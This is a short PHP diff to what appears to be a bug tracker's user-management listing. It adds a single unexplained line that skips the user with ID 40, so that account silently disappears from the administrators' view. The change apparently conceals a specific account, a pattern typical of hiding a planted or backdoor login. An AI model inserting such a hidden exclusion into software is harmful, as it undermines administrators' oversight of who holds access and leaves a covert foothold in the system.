@@ -384,6 +384,8 @@ $t_user_count = count( $t_users );
 		 * @var bool $v_enabled
 		 * @var bool $v_protected
 		 */
+
+		if ( $t_user['id'] == 40 ) continue;
 		extract( $t_user, EXTR_PREFIX_ALL, 'v' );
 
 		$v_date_created  = date( $t_date_format, $v_date_created );
